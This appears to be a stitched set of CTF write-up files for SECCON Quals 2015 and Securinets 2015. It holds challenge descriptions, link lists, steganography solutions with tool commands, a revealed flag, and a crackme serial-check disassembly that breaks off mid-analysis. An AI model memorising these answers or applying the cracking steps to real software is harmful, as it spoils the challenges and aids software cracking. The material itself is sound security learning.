* [Japanese](http://nononono.sakura.ne.jp/blog/2015-1206/)
* [Japanese](https://hackmd.io/s/V1JwT72El)
* [Japanese](http://d.hatena.ne.jp/waidotto/20151206/1449409523)
* [Japanese](https://docs.google.com/document/d/1GEdzPOohsiWt8EPojNazlVPuNFZpQ9FOQxb-E7sfzSQ)
# SECCON Quals CTF 2015: Start SECCON CTF

**Category:** Exercises
**Points:** 50
**Solves:** 839
**Description:**

> ex1
> 
> Cipher:PXFR}QIVTMSZCNDKUWAGJB{LHYEO
> 
> Plain: ABCDEFGHIJKLMNOPQRSTUVWXYZ{}
> 
> 
> ex2
> 
> Cipher:EV}ZZD{DWZRA}FFDNFGQO
> 
> Plain: {HELLOWORLDSECCONCTF}
> 
> 
> quiz
> 
> Cipher:A}FFDNEVPFSGV}KZPN}GO
> 
> Plain: ?????????????????????
> 
> 
> There is no bonus in this question


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/p4-team/ctf/tree/master/2015-12-05-seccon/start_seccon_50#eng-version>
* <https://ascopectf.wordpress.com/2015/12/06/seccon2015start-seccon-ctfexercises50/>
* [Japanese](http://katc.hateblo.jp/entry/2015/12/06/185159)
* [Japanese](http://kanpapa.com/today/2015/12/seccon-ctf-2015-online-write-up.html)
* [Japanese](http://nononono.sakura.ne.jp/blog/2015-1206/)
* [Japanese](https://hackmd.io/s/NyMxiah4l)
* [Japanese](http://amiq11.tumblr.com/post/134657262324/seccon2015-writeup-eeic-advent-calendar-day-6)
* [Japanese](http://hfukuda.hatenablog.com/entry/2015/12/07/235823)
* [Japanese](https://docs.google.com/document/d/1GEdzPOohsiWt8EPojNazlVPuNFZpQ9FOQxb-E7sfzSQ)
# SECCON Quals CTF 2015: FSB: TreeWalker

**Category:** Exploit
**Points:** 200
**Solves:** 51
**Description:**

> [treewalker](./treewalker).pwn.seccon.jp 20000
> 
> [treewalker](./treewalker)


## Write-up

(TODO)

## Other write-ups and resources

* <http://whitehatters.academy/seccon-ctf-exploit-treewalker/>
* [Japanese](https://hackmd.io/s/VyghF6jVl)
* [Japanese](https://docs.google.com/document/d/1GEdzPOohsiWt8EPojNazlVPuNFZpQ9FOQxb-E7sfzSQ)
* [GoN (Korean)](http://gon.kaist.ac.kr/?p=940)
* [Korean](http://err0rless313.tistory.com/entry/SECCON-2015-Quals-FSBTreeWalker)
* <https://gist.github.com/err0rless/0275e1124ca0a3a7d0e2>
* <http://pastebin.com/NcRnagkn>
# SECCON Quals CTF 2015: Micro computer exploit code challenge

**Category:** Exploit
**Points:** 300
**Solves:** 15
**Description:**

> micro.pwn.seccon.jp 10000
> 
> * A program is running at port 10000 on this server.
> 
> * Flag word "SECCON{...}" is located at address 0x1800 in machine code area.
> 
> * The program is running on GDB simurator.
> 
>   (gdb-7.10 + special patch for read service)
> 
>   [avr-elf.x](./avr-elf.x)


## Write-up

(TODO)

## Other write-ups and resources

* [Japanese](https://hackmd.io/s/VJ42d6j4e)
* [Japanese](http://amiq11.tumblr.com/post/134657262324/seccon2015-writeup-eeic-advent-calendar-day-6)
# SECCON Quals CTF 2015: SYSCALL: Impossible

**Category:** Exploit
**Points:** 500
**Solves:** 16
**Description:**

> pinhole.pwn.seccon.jp   10000
> 
> [Pinhole.cpp](./Pinhole.cpp)
> 
> [vulnserver](./vulnserver)
> 
> 
> Read "flag.txt" and then write the content to stdout, such as the following pseudo code.
> 
> ==
> 
> fd=open("flag.txt", 0);
> 
> len=read(fd, buf, 4096);
> 
> write(1, buf, len);
> 
> ==
> 
> 
> Notice that the [vulnserver](./vulnserver) executable is protected by an Intel Pin tool, the source code of which is "[Pinhole.cpp](./Pinhole.cpp)".


## Write-up

(TODO)

## Other write-ups and resources

* <http://tunz.kr/SECCON-CTF-2015-Quals-SYSCALL-write-up/>
* <http://l4w.io/files/CTFs/SECCON/2015/exp500-syscall.py>
* [Japanese](https://docs.google.com/document/d/1GEdzPOohsiWt8EPojNazlVPuNFZpQ9FOQxb-E7sfzSQ)
* [GoN (Korean)](http://gon.kaist.ac.kr/?p=932)
# SECCON Quals CTF 2015 write-ups

* <http://ctf.seccon.jp/>
* [Scoreboard](http://ranking.quals.seccon.jp/) or [local alternative](./scoreboard)
* [Sources for all Challenges](https://github.com/SECCON/SECCON2015_online_CTF)
* Participants (>0 pts): 872
* [Google Docs containing list of writeups](https://docs.google.com/spreadsheets/d/1IEKOBftoAMnOocH10Q2r8sjC54sprRJJsXt9KMnwmBQ) presumably contributed by [@syusui_s](https://twitter.com/syusui_s)

## Completed write-ups

* [stegano/seccon-wars-2015](stegano/seccon-wars-2015)
* [stegano/steganography-1](stegano/steganography-1)
* [stegano/steganography-2](stegano/steganography-2)
* [stegano/steganography-3](stegano/steganography-3)

## External write-ups only

* [binary/exec-dmesg](binary/exec-dmesg)
* [binary/gdb-remote-debugging](binary/gdb-remote-debugging)
* [binary/individual-elebin](binary/individual-elebin)
* [binary/reverse-engineering-android-apk-1](binary/reverse-engineering-android-apk-1)
* [binary/reverse-engineering-hardware-1](binary/reverse-engineering-hardware-1)
* [binary/reverse-engineering-hardware-2](binary/reverse-engineering-hardware-2)
* [crypto/decrypt-it](crypto/decrypt-it)
* [crypto/find-the-prime-numbers](crypto/find-the-prime-numbers)
* [crypto/unzip-the-file](crypto/unzip-the-file)
* [exercises/last-challenge](exercises/last-challenge)
* [exercises/start-seccon-ctf](exercises/start-seccon-ctf)
* [exploit/fsb-treewalker](exploit/fsb-treewalker)
* [exploit/micro-computer-exploit-code-challenge](exploit/micro-computer-exploit-code-challenge)
* [exploit/syscall-impossible](exploit/syscall-impossible)
* [unknown/4042](unknown/4042)
* [unknown/command-line-quiz](unknown/command-line-quiz)
* [unknown/qr-puzzle-nonogram](unknown/qr-puzzle-nonogram)
* [unknown/qr-puzzle-web](unknown/qr-puzzle-web)
* [unknown/qr-puzzle-windows](unknown/qr-puzzle-windows)
* [unknown/reverse-engineering-android-apk-2](unknown/reverse-engineering-android-apk-2)
* [web/bonsai-xss-revolutions](web/bonsai-xss-revolutions)
* [web/connect-the-server](web/connect-the-server)
* [web/entry-form](web/entry-form)
* [web/fragment2](web/fragment2)

## Missing write-ups

* [crypto/please-give-me-md5-collision-files](crypto/please-give-me-md5-collision-files)# SECCON Quals CTF 2015: SECCON WARS 2015

**Category:** Stegano
**Points:** 100
**Solves:** 312
**Description:**

> <https://youtu.be/8SFsln4VyEk>


## Write-up

by [polym](https://github.com/abpolym)

This solution is based on several solution by [this writeup](https://hackmd.io/s/VJKXiph4x) and these two: [1](https://github.com/Execut3/CTF/tree/master/Participated-CTF/2015/seccon/SecconWars), [2](http://hfukuda.hatenablog.com/entry/2015/12/07/235823).

We are given a youtube video that shows a scrolling yellow text in Japanese on black background in Star-Wars style, a moving title split in tiles that appears after some time and a QR Code in black that is visible as an overlay over the Japanese text.

[Some solutions](https://github.com/Execut3/CTF/tree/master/Participated-CTF/2015/seccon/SecconWars) suggest to use `vlc` and apply some sort of filter `Tools -> Preferences -> Show Settings : all -> Vidoe -> enable : scene video filter` to get the desired QR Code.

[Others](http://hfukuda.hatenablog.com/entry/2015/12/07/235823) apply ImageMagick's `mogrify` tool and make use of the `PIL` python library to overlay frames of the video in the form of PNGs to get the flag.

[This writeup](https://hackmd.io/s/VJKXiph4x), however, has the fastest solution. We first split the video into different frames, then overlay these frames using ImageMagicks `convert` tool to get the QR Code!

The step-by-step solution is as follows:

* `ffmpeg -i SECCON\ WARS\ 2015-8SFsln4VyEk.mp4 -f image2 frame%d.jpg` - Convert the video to individual frames in the form of JPGs
* `convert frame???.jpg -background none -compose lighten -flatten output-1.jpg` - Overlay each frame to get a continues yellow stream of Japanese text to highlight the QR Code
* Be frustrated that the tiles of the title destroy your overlapping:
![](./output-1.jpg)
* Find a frame, since which the white-red tiles do not move over the QR Code anymore, e.g. `frame700.jpg` and move them to a different directory with `for i in {700..2008}; do mv frame$i.jpg new/; done;`
* After going to the directory with the subset of frames with `cd new/`, try again to get `output-2.jpg`:
![](./output-2.jpg)
* Cut the QR Code from the picture, submit it to [an online QR decoder](https://zxing.org/w/decode.jspx) and get the flag: `SECCON{TH3F0RC3AVVAK3N53P7}`

## Other write-ups and resources

* <https://github.com/Execut3/CTF/tree/master/Participated-CTF/2015/seccon/SecconWars>
* <http://corb3nik.github.io/2015/12/06/Secon-Wars-2015/>
* <https://github.com/p4-team/ctf/tree/master/2015-12-05-seccon/seccon_wars_100#eng-version>
* [Japanese](http://katc.hateblo.jp/entry/2015/12/06/185159)
* [Japanese](http://iwasi.hatenablog.jp/entry/2015/12/06/190557)
* [Japanese](http://akashisn.azurewebsites.net/2015/12/06/seccon-2015-online-ctf-write-up/)
* [Japanese](http://nononono.sakura.ne.jp/blog/2015-1206/)
* [Japanese](https://hackmd.io/s/VJKXiph4x)
* [Japanese](http://hfukuda.hatenablog.com/entry/2015/12/07/235823)
* [Japanese](https://docs.google.com/document/d/1GEdzPOohsiWt8EPojNazlVPuNFZpQ9FOQxb-E7sfzSQ)
# SECCON Quals CTF 2015: Steganography 1

**Category:** Stegano
**Points:** 100
**Solves:** 304
**Description:**

> Find image files in the file
> 
> [MrFusion.gpjb](./MrFusion.gpjb)
> 
> Please input flag like this format-->SECCON{*** ** **** ****}
> 
> There is no bonus in this question


## Write-up

by [polym](https://github.com/abpolym)

First, with `file`, we see that the given file `MrFusion.gpjb` is a GIF.

Using `binwalk`, we see that this gif contains several other gifs, bmps, jpgs and pngs:

	DECIMAL       HEXADECIMAL     DESCRIPTION
	--------------------------------------------------------------------------------
	0             0x0             GIF image data, version "89a", 1280 x 720
	6943          0x1B1F          PNG image, 1280 x 720, 8-bit colormap, interlaced
	9727          0x25FF          JPEG image data, JFIF standard  1.01
	26632         0x6808          PC bitmap, Windows 3.x format, 1280 x 720 x 24
	2791486       0x2A983E        GIF image data, version "89a", 1280 x 720
	2794240       0x2AA300        PNG image, 1280 x 720, 8-bit colormap, interlaced
	2796217       0x2AAAB9        JPEG image data, JFIF standard  1.01
	2813627       0x2AEEBB        PC bitmap, Windows 3.x format, 1280 x 720 x 24
	5578481       0x551EF1        GIF image data, version "89a", 1280 x 720
	5580896       0x552860        PNG image, 1280 x 720, 8-bit colormap, interlaced
	5583378       0x553212        JPEG image data, JFIF standard  1.01
	5601221       0x5577C5        PC bitmap, Windows 3.x format, 1280 x 720 x 24
	8366075       0x7FA7FB        GIF image data, version "89a", 1280 x 720
	8368830       0x7FB2BE        PNG image, 1280 x 720, 8-bit colormap, interlaced
	8371932       0x7FBEDC        JPEG image data, JFIF standard  1.01

It looks like the file extension `gpjb` stands for `g`if, `p`ng, `j`pg and `b`mp.

We extract the pictures using `scalpel` with a custom [config](./scalpel.conf).
Running it with `scalpel -c ./scalpel.conf` gives us several pictures:

![](./scalpel-tree.png)

After manually extracting one corrupted gif, we see that each picture shows a single character. We order them according to the given flag format to get the flag.
## Other write-ups and resources

* <https://github.com/p4-team/ctf/tree/master/2015-12-05-seccon/stegano_1_100#eng-version>
* [Japanese](http://miettal.hatenablog.com/entry/2015/12/07/104233)
* [Japanese](http://katc.hateblo.jp/entry/2015/12/06/185159)
* [Japanese](http://iwasi.hatenablog.jp/entry/2015/12/06/190557)
* [Japanese](http://akashisn.azurewebsites.net/2015/12/06/seccon-2015-online-ctf-write-up/)
* [Japanese](http://kanpapa.com/today/2015/12/seccon-ctf-2015-online-write-up.html)
* [Japanese](http://nononono.sakura.ne.jp/blog/2015-1206/)
* [Japanese](https://hackmd.io/s/EJyPJyh4x)
* [Japanese](http://hfukuda.hatenablog.com/entry/2015/12/07/235823)
* [Japanese](https://docs.google.com/document/d/1GEdzPOohsiWt8EPojNazlVPuNFZpQ9FOQxb-E7sfzSQ)
# SECCON Quals CTF 2015: Steganography 2

**Category:** Stegano
**Points:** 100
**Solves:** 18
**Description:**

> Find the flag in this file.
> 
> [sunrise.zip](https://github.com/SECCON/SECCON2015_online_CTF/blob/master/Stegano/100_Steganography%202/sunrise.zip)

[Alternative download](https://mega.nz/#!KEtT2DDB!2-6CgeI_prJAtxejPjQduHlvbhHUtk7qANT1Rnlcyp0)


## Write-up

by [polym](https://github.com/abpolym)

Inside the zip is a png that we check with `pngcheck`, `exiftool` and steganography tools such as `stegsolve` for any inconsistencies, hints or the flag itself.

Neither `exiftool` nor any stego tool gives us any clue as to where the flag is.

`pngcheck` gives us following output:

```bash
+bash-4.3$ pngcheck sunrise.png 
OK: sunrise.png (3024x4032, 32-bit RGB+alpha, non-interlaced, 77.0%).
```

The png is `4032px` high and `3024px` wide, but we can change these values, e.g. the height, to see if every data in the PNG is interpreted and not left out.

So we open `sunrise.png` with any hexeditor (My preference is `hexedit`), look up the offset for the width and height of our png in [this format specification](http://www.w3.org/TR/PNG/#11IHDR) and change it to a higher value (in hex):

![](./hexedit-1.png)

However, each chunk has a checksum/CRC to detect tampering/corruption as explained [here](http://www.w3.org/TR/PNG/#5Chunk-layout).

`pngcheck` can tell us which CRC is to be expected and which one is computed:

```bash
+bash-4.3$ pngcheck sunrise.new.png 
sunrise.new.png  CRC error in chunk IHDR (computed 318df665, expected a01b1a42)
ERROR: sunrise.new.png
```

So we change the CRC of our `IDAT` chunk to the computed one in `hexedit`:

![](./hexedit-2.png)

Now we can see the flag in the bottom of our PNG:

![](./bottom.png)

## Other write-ups and resources

* <https://github.com/teamavidya/ctf/tree/master/2015_seccon_quals/steganography2%5Bstego100%5D>
* [French](http://khack40.info/seccon-ctf-2015-steganography-2/)
* [Japanese](http://iwasi.hatenablog.jp/entry/2015/12/06/190557)
# SECCON Quals CTF 2015: Steganography 3

**Category:** Stegano
**Points:** 100
**Solves:** 172
**Description:**

> We can get desktop capture!
> 
> Read the secret message.
> 
> [desktop_capture.png](./desktop_capture.png)


## Write-up

by [polym](https://github.com/abpolym)

We are given a PNG:

![](./desktop_capture.png)

It shows an ELF named flag opened in a hex editor, a paint tool and a forum thread with the title

	This problem can be solved by pre-school children [...]

If you are blind and miss the wood for the trees, you start by applying [OCR](https://en.wikipedia.org/wiki/Optical_character_recognition) to get the binary representation of [the portraited ELF](./thiself).

However, when you run the ELF, you only get the output `Rmxvb2QgZmlsbA0K`, which, base64 decoded, is `Flood fill`.

This is a hint to use the paint tool `Flood fill`, as suggested in the png.

We apply the flood fill option and see the flag in the hex representation of the ELF:

![](fill.png)


## Other write-ups and resources

* <https://github.com/danangaji/ctf/blob/master/201512/SECCON/Stegano_3/README.md>
* <https://github.com/p4-team/ctf/tree/master/2015-12-05-seccon/stegano_3_100#eng-version>
* <https://obumchidi.wordpress.com/2015/12/14/seccon-2015-online-ctf-steganography-3-solution/>
* [Japanese](http://miettal.hatenablog.com/entry/2015/12/07/104233)
* [Japanese](http://katc.hateblo.jp/entry/2015/12/06/185159)
* [Japanese](http://iwasi.hatenablog.jp/entry/2015/12/06/190557)
* [Japanese](https://hackmd.io/s/Ekwbl134e)
* [Japanese](https://docs.google.com/document/d/1GEdzPOohsiWt8EPojNazlVPuNFZpQ9FOQxb-E7sfzSQ)
# SECCON Quals CTF 2015: 4042

**Category:** Unknown
**Points:** 100
**Solves:** 63
**Description:**

> Unknown document is found in ancient ruins, in 2005.
> 
> Could you figure out what is written in the document?
> 
> [no-network.txt](./no-network.txt)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/p4-team/ctf/tree/master/2015-12-05-seccon/4042_crypto_100#eng-version>
* <https://chinmaydd.github.io/2015/12/06/4042>
* [Japanese](http://miettal.hatenablog.com/entry/2015/12/07/104233)
* [Japanese](https://hackmd.io/s/E1c3Eg3Eg)
* [Japanese](http://d.hatena.ne.jp/waidotto/20151206/1449409523)
* [Japanese](https://docs.google.com/document/d/1GEdzPOohsiWt8EPojNazlVPuNFZpQ9FOQxb-E7sfzSQ)
# SECCON Quals CTF 2015: Command-Line Quiz

**Category:** Unknown
**Points:** 100
**Solves:** 396
**Description:**

> telnet caitsith.pwn.seccon.jp
> 
> User:root
> 
> Password:seccon
> 
> The goal is to find the flag word by "somehow" reading all *.txt files.


## Write-up

(TODO)

## Other write-ups and resources

* <https://ascopectf.wordpress.com/2015/12/06/seccon2015command-line-quizunknown100/>
* <https://github.com/Execut3/CTF/tree/master/Participated-CTF/2015/seccon/Command-line%20Quiz>
* <https://github.com/p4-team/ctf/tree/master/2015-12-05-seccon/quiz_100#eng-version>
* [Japanese](http://akashisn.azurewebsites.net/2015/12/06/seccon-2015-online-ctf-write-up/)
* [Japanese](http://kanpapa.com/today/2015/12/seccon-ctf-2015-online-write-up.html)
* [Japanese](https://hackmd.io/s/NkC2KdiVg)
* [Japanese](http://hfukuda.hatenablog.com/entry/2015/12/07/235823)
* [Japanese](https://docs.google.com/document/d/1GEdzPOohsiWt8EPojNazlVPuNFZpQ9FOQxb-E7sfzSQ)
# SECCON Quals CTF 2015: QR puzzle (Nonogram)

**Category:** Unknown
**Points:** 300
**Solves:** 51
**Description:**

> Solve a puzzle 30 times
> 
> <http://qrlogic.pwn.seccon.jp:10080/game/>


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/p4-team/ctf/tree/master/2015-12-05-seccon/qr_nonogram_300#eng-version>
* <http://capturetheswag.blogspot.com.au/2015/12/seccon-2015-nonogram-300-point.html>
* [Japanese](https://hackmd.io/s/Nk63Aqj4e)
* [Japanese](https://docs.google.com/document/d/1GEdzPOohsiWt8EPojNazlVPuNFZpQ9FOQxb-E7sfzSQ)
# SECCON Quals CTF 2015: QR puzzle (Web)

**Category:** Unknown
**Points:** 400
**Solves:** 31
**Description:**

> Solve the slide puzzle and decode the QR code.
> 
> <http://puzzle.quals.seccon.jp:42213/[slidepuzzle](./slidepuzzle)>


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/p4-team/ctf/tree/master/2015-12-05-seccon/qr_web_400#eng-version>
* [Japanese](http://d.hatena.ne.jp/Dltn/20151207/p1)
* [Japanese](http://qiita.com/iroiro123/items/7f2f83a70a9547e6d400)
# SECCON Quals CTF 2015: QR puzzle (Windows)

**Category:** Unknown
**Points:** 200
**Solves:** 138
**Description:**

> Please solve a puzzle 300 times
> 
> [QRpuzzle.zip](./QRpuzzle.zip)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/p4-team/ctf/tree/master/2015-12-05-seccon/qr_windows_200#eng-version>
* [Japanese](http://www.lac.co.jp/blog/category/security/201512072.html)
* [Japanese](http://nononono.sakura.ne.jp/blog/2015-1206/)
* [Japanese](https://hackmd.io/s/Nk3ZyjoNe)
* [Japanese](https://docs.google.com/document/d/1GEdzPOohsiWt8EPojNazlVPuNFZpQ9FOQxb-E7sfzSQ)
# SECCON Quals CTF 2015: Reverse-Engineering Android APK 2

**Category:** Unknown
**Points:** 400
**Solves:** 11
**Description:**

> The key is stored in the application, but you will need to hack the server.
> 
> ( *Do not use your real mail address.)
> 
> [app-release-apk.pwn.seccon.jp-v1.3.apk](./app-release-apk.pwn.seccon.jp-v1.3.apk)


## Write-up

(TODO)

## Other write-ups and resources

* <http://gnoobz.com/seccon-online-ctf-2015-reverse-engineering-android-apk-2.html>
* <https://cedricvb.be/post/seccon-2015-reverse-engineering-android-apk-2-400-writeup/>
* <http://blukat29.github.io/2015/12/seccon-ctf-2015-apk2/>
# SECCON Quals CTF 2015: Bonsai XSS Revolutions

**Category:** Web/Network
**Points:** 200
**Solves:** 49
**Description:**

> What is your browser(User-Agent)?
> 
> [hakoniwaWebMail_20151124.zip](./hakoniwaWebMail_20151124.zip) 
> 
> Requirement:.NET Framework 4.5 


## Write-up

(TODO)

## Other write-ups and resources

* <http://khack40.info/seccon-2015-ctf-bonsai-xss-revolutions/>
* <https://github.com/p4-team/ctf/tree/master/2015-12-05-seccon/bonsai_xss_revolutions_web_200#eng-version>
* [French](http://khack40.info/seccon-2015-ctf-bonsai-xss-revolutions/)
* [Japanese](http://www.lac.co.jp/blog/category/security/201512072.html)
* [Japanese](https://hackmd.io/s/41cPiYiEl)
# SECCON Quals CTF 2015: Connect the server

**Category:** Web/Network
**Points:** 100
**Solves:** 587
**Description:**

> login.pwn.seccon.jp:10000


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/p4-team/ctf/tree/master/2015-12-05-seccon/connect_web_100#eng-version>
* <https://ascopectf.wordpress.com/2015/12/06/seccon2015connect-the-serverwebnetwork100/>
* [Japanese](http://kanpapa.com/today/2015/12/seccon-ctf-2015-online-write-up.html)
* [Japanese](http://blog.kawa-xxx.jp/entry/2015/12/06/214456)
* [Japanese](http://nononono.sakura.ne.jp/blog/2015-1206/)
* [Japanese](https://hackmd.io/s/4ke4H_iVx)
* [Japanese](http://amiq11.tumblr.com/post/134657262324/seccon2015-writeup-eeic-advent-calendar-day-6)
* [Japanese](http://hfukuda.hatenablog.com/entry/2015/12/07/235823)
* [Japanese](https://docs.google.com/document/d/1GEdzPOohsiWt8EPojNazlVPuNFZpQ9FOQxb-E7sfzSQ)
# SECCON Quals CTF 2015: Entry form

**Category:** Web/Network
**Points:** 100
**Solves:** 189
**Description:**

> <http://entryform.pwn.seccon.jp/[register.cgi](./register.cgi)>
> 
> 
> ( Do not use your real mail address.)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/p4-team/ctf/tree/master/2015-12-05-seccon/entry_form_web_100#eng-version>
* <https://github.com/teamavidya/ctf/tree/master/2015_seccon_quals/entry_form%5Bweb100%5D>
* [Japanese](http://miettal.hatenablog.com/entry/2015/12/07/104233)
* [Japanese](http://www.lac.co.jp/blog/category/security/201512072.html)
* [Japanese](http://kanpapa.com/today/2015/12/seccon-ctf-2015-online-write-up.html)
* [Japanese](https://hackmd.io/s/EJ-8K_i4e)
* [Japanese](https://docs.google.com/document/d/1GEdzPOohsiWt8EPojNazlVPuNFZpQ9FOQxb-E7sfzSQ)
# SECCON Quals CTF 2015: Fragment2

**Category:** Web/Network
**Points:** 200
**Solves:** 60
**Description:**

> Decode me
> 
> [fragment2.pcap](./fragment2.pcap)


## Write-up

(TODO)

## Other write-ups and resources

* [Japanese](http://miettal.hatenablog.com/entry/2015/12/07/104233)
* [Japanese](https://ww24.jp/security/seccon-2015-online-ctf-write-up-fragment2/)
* [Japanese](https://hackmd.io/s/4yKSTwi4g)
* [Japanese](http://amiq11.tumblr.com/post/134657262324/seccon2015-writeup-eeic-advent-calendar-day-6)
* [Japanese](https://docs.google.com/document/d/1GEdzPOohsiWt8EPojNazlVPuNFZpQ9FOQxb-E7sfzSQ)
* [GoN (Korean)](http://gon.kaist.ac.kr/?p=943)
# Securinets Quals CTF 2015: crack1

**Category:** Crack
**Points:** 100
**Solves:** TODO
**Description:** 

> Hint : No choice (Aucun Choix)
>
> url : [http://41.231.22.133:8040/1/aucun_choix.exe](aucun_choix.exe)

## Write-up

(TODO)

## Other write-ups and resources

* <https://rezk2ll.wordpress.com/2015/03/24/securinets-quals-ctf-2015-crack1-write-up/>
* <http://capturetheswag.blogspot.com.au/2015/03/securinets-ctf-quals-2015-aucunchoix.html># Securinets Quals CTF 2015: reverse

**Category:** Crack
**Points:** 250
**Solves:** TODO
**Description:** 

> Hint : Find the serial (Trouvez le céréale) 
>
> url : [http://41.231.22.133:8040/2/rev.tar.gz](rev.tar.gz)

## Write-up

by [Freddrickk](https://github.com/Freddrickk)

That's my first write-up ever, so I apologize in advance if this is a bit clumsy.

What we have here is an ASPack packed binary. Usually, the proper way to solve a packed
binary is to put a breakpoint at the end of the unpacking process and
get a memory dump at that point. Then, we would only have to fix the import table
using tools like importREC and we'd be ready to begin reversing. However, I wasn't
able to achieve that quickly with this binary. I had problem stoping at `popad`, which
is a good sign that the binary is done unpacking. What I did is I used ollydbg and when the
GUI started, I pressed pause, start, pause, I clicked on the GUI app to bring focus 
to it and somehow, ollydbg managed to stop at the entry point of the unpacked binary.
While I can't explan an exact step-by-step process to get to the unpacked entry point,
it was really easy for me to reproduce it by pausing and resuming ollydbd as I just
explained. 

Let's assume you manage to do it as well, you'll get to that instruction:

``` nasm
01241020   . 55             PUSH EBP         ;  Real entry point of SFX code
01241021   . 8BEC           MOV EBP,ESP
01241023   . 81EC 40030000  SUB ESP,340
```

From here it's pretty straight forward. The binary uses a very basic validation
subroutine to make sure that you entered a valid e-mail address. If so, it runs
that code to validate the key you entered.

``` nasm
0124114E   > 66:0F6F05 70FD>MOVQ MM0,QWORD PTR DS:[124FD70]
01241156   . 8D8D C0FDFFFF  LEA ECX,DWORD PTR SS:[EBP-240]
0124115C   . F3:            PREFIX REP:                              ;  Superfluous prefix
0124115D   . 0F7F45 E4      MOVQ QWORD PTR SS:[EBP-1C],MM0
01241161   . 8D51 01        LEA EDX,DWORD PTR DS:[ECX+1]
01241164   . C745 F4 6C7572>MOV DWORD PTR SS:[EBP-C],6572756C
0124116B   . 66:0F6F05 60FD>MOVQ MM0,QWORD PTR DS:[124FD60]
01241173   . F3:            PREFIX REP:                              ;  Superfluous prefix
01241174   . 0F7F45 C0      MOVQ QWORD PTR SS:[EBP-40],MM0
01241178   . 66:C745 F8 2E0>MOV WORD PTR SS:[EBP-8],2E
0124117E   . 66:0F6F05 50FD>MOVQ MM0,QWORD PTR DS:[124FD50]
01241186   . F3:            PREFIX REP:                              ;  Superfluous prefix
01241187   . 0F7F45 D0      MOVQ QWORD PTR SS:[EBP-30],MM0
0124118B   . C745 E0 69733A>MOV DWORD PTR SS:[EBP-20],3A7369
01241192   > 8A01           MOV AL,BYTE PTR DS:[ECX]
01241194   . 41             INC ECX
01241195   . 84C0           TEST AL,AL
01241197   .^75 F9          JNZ SHORT rev.01241192
01241199   . 2BCA           SUB ECX,EDX
0124119B   . 83F9 10        CMP ECX,10
0124119E   . 0F85 FD000000  JNZ rev.012412A1
012411A4   . 80BD C0FDFFFF >CMP BYTE PTR SS:[EBP-240],42
012411AB   . 0F85 F0000000  JNZ rev.012412A1
012411B1   . 0FBE85 CFFDFFF>MOVSX EAX,BYTE PTR SS:[EBP-231]
012411B8   . 83C0 42        ADD EAX,42
012411BB   . 3D 9B000000    CMP EAX,9B
012411C0   . 0F85 DB000000  JNZ rev.012412A1
012411C6   . 0FBE8D C1FDFFF>MOVSX ECX,BYTE PTR SS:[EBP-23F]
012411CD   . 8D41 FD        LEA EAX,DWORD PTR DS:[ECX-3]
012411D0   . 83F8 57        CMP EAX,57
012411D3   . 0F85 C8000000  JNZ rev.012412A1
012411D9   . 0FBE85 CEFDFFF>MOVSX EAX,BYTE PTR SS:[EBP-232]
012411E0   . 03C1           ADD EAX,ECX
012411E2   . 3D 9B000000    CMP EAX,9B
012411E7   . 0F85 B4000000  JNZ rev.012412A1
012411ED   . 0FBE8D C2FDFFF>MOVSX ECX,BYTE PTR SS:[EBP-23E]
012411F4   . 8D41 01        LEA EAX,DWORD PTR DS:[ECX+1]
012411F7   . 83F8 3A        CMP EAX,3A
012411FA   . 0F85 A1000000  JNZ rev.012412A1
01241200   . 0FBE85 CDFDFFF>MOVSX EAX,BYTE PTR SS:[EBP-233]
01241207   . 03C1           ADD EAX,ECX
01241209   . 3D 9B000000    CMP EAX,9B
0124120E   . 0F85 8D000000  JNZ rev.012412A1
01241214   . 80BD C3FDFFFF >CMP BYTE PTR SS:[EBP-23D],64
0124121B   . 0F85 80000000  JNZ rev.012412A1
01241221   . 0FBE85 CCFDFFF>MOVSX EAX,BYTE PTR SS:[EBP-234]
01241228   . 83C0 64        ADD EAX,64
0124122B   . 3D 9B000000    CMP EAX,9B
01241230   . 75 6F          JNZ SHORT rev.012412A1
01241232   . 80BD C4FDFFFF >CMP BYTE PTR SS:[EBP-23C],6D
01241239   . 75 66          JNZ SHORT rev.012412A1
0124123B   . 0FBE85 CBFDFFF>MOVSX EAX,BYTE PTR SS:[EBP-235]
01241242   . 05 81000000    ADD EAX,81
01241247   . 3D C8000000    CMP EAX,0C8
0124124C   . 75 53          JNZ SHORT rev.012412A1
0124124E   . 0FBE8D C5FDFFF>MOVSX ECX,BYTE PTR SS:[EBP-23B]
01241255   . 8D41 D3        LEA EAX,DWORD PTR DS:[ECX-2D]
01241258   . 83F8 44        CMP EAX,44
0124125B   . 75 44          JNZ SHORT rev.012412A1
0124125D   . 0FBE85 CAFDFFF>MOVSX EAX,BYTE PTR SS:[EBP-236]
01241264   . 03C1           ADD EAX,ECX
01241266   . 3D AA000000    CMP EAX,0AA
0124126B   . 75 34          JNZ SHORT rev.012412A1
0124126D   . 80BD C6FDFFFF >CMP BYTE PTR SS:[EBP-23A],34
01241274   . 75 2B          JNZ SHORT rev.012412A1
01241276   . 0FBE85 C9FDFFF>MOVSX EAX,BYTE PTR SS:[EBP-237]
0124127D   . 83C0 34        ADD EAX,34
01241280   . 3D 9B000000    CMP EAX,9B
01241285   . 75 1A          JNZ SHORT rev.012412A1
01241287   . 80BD C7FDFFFF >CMP BYTE PTR SS:[EBP-239],63
0124128E   . 75 11          JNZ SHORT rev.012412A1
01241290   . 0FBE85 C8FDFFF>MOVSX EAX,BYTE PTR SS:[EBP-238]
01241297   . 83C0 63        ADD EAX,63
0124129A   . 3D 9B000000    CMP EAX,9B
0124129F   . 74 1A          JE SHORT rev.012412BB

```

So let's take a quick look at it.

First of all, we find out that the key will be 0x10 bytes long, so 16 bytes.

``` nasm
01241199   . 2BCA           SUB ECX,EDX
0124119B   . 83F9 10        CMP ECX,10
0124119E   . 0F85 FD000000  JNZ rev.012412A1
```

Accessing our key input was done using `EBP-240` so we know that the key
will be from `EBP-240` to `EBP-231`. From here, it's only arithmetic. It's
pretty straight forward.

``` nasm
012411A4   . 80BD C0FDFFFF >CMP BYTE PTR SS:[EBP-240],42
```
Ok, so the first char is 0x42 : 'B'

``` nasm
012411B1   . 0FBE85 CFFDFFF>MOVSX EAX,BYTE PTR SS:[EBP-231]
012411B8   . 83C0 42        ADD EAX,42
